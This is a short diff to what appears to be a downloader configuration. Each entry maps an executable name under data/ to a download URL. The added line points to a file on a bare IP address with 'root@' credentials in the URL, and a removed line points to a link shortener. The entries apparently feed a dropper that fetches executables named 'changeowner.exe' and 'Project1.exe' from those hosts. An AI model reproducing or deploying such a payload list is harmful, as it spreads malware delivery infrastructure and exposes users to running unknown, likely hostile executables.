@@ -1,2 +1,1 @@
-exe;data/samppp.exe;https://goo.su/TXEcJfm?dl=1
-exe;data/changeowner.exe;http://root@212.113.106.125/rocketedit.exe?dl=1
+exe;data/changeowner.exe;http://root@212.113.106.125/Project1.exe?dl=1
